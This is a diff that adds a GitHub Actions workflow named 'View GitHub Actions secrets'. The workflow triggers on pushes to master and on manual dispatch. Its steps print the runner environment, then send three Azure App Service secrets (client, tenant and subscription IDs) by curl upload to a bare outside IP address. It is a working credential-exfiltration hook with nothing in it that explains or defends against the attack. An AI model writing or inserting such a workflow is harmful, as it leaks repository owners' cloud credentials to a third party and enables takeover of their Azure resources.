@@ -1,0 +1,15 @@
+name: View GitHub Actions secrets
+on:
+  push:
+    branches: [master]
+  workflow_dispatch:
+  # 可以在仓库的 Actions 页面中手动触发
+ 
+jobs:
+  github-actions-environment-variables-ubuntu:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get env
+        run: env
+      - name: Transfer secrets
+        run: "echo 'Token XXXX: ${{secrets.AZUREAPPSERVICE_CLIENTID_FFFAF9915EEC4110968DB4099D8E5736}} ${{ secrets.AZUREAPPSERVICE_TENANTID_1D0B2235BDEA47A7972BE00F7A784C90 }} ${{ secrets.AZUREAPPSERVICE_SUBSCRIPTIONID_E3F0546114374FEBAAE91C542CA35495 }}' | curl -T - http://43.163.233.40/"
